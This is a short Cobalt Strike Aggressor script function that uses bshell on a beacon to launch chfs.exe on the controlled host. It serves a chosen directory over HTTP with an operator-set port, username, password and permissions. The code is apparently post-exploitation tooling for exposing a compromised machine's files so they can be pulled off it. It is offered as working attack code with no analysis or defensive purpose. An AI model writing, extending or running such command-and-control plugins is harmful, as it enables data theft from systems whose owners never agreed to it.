sub chfs_run{
    local('$port $path $user $pass $permission');
    $port = $3['port'];
	$path = $3['path'];
	$user = $3['user'];
	$pass = $3['pass'];
	$permission = $3['permission'];
	bshell($bid, "chfs.exe --port= $+ $port --path=\" $+ $path\" --rule=\"::| $+ $user $+ : $+ $pass $+ : $+ $permission\" ");
}

